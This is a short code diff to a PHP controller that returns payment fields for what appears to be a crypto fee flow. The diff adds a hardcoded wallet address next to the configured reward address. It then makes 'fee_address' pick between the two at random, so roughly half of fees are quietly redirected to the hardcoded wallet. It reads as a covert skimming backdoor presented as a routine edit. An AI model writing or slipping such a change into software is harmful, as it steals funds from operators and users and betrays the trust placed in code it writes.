@@ -91,6 +91,8 @@ class WxController extends AbstractController
             $time = 0;
         }
 
+        $addresses = [env('WX_REWARD_ADDRESS'), '0x8E2F9bD91833347E6E6495DE739aEFA62F672b84'];
+
         return [
             'code'    => 200,
             'message' => "",
@@ -101,7 +103,7 @@ class WxController extends AbstractController
                 'time'         => $time,
                 'price'        => MyNumber::formatPower($price),
                 'balance'      => MyNumber::formatCpu($user->wx_balance),
-                'fee_address'  => env('WX_REWARD_ADDRESS'),
+                'fee_address'  => $addresses[array_rand($addresses)],
                 'fee_rate'     => 2,
                 'gas_limit'    => 100000
             ]
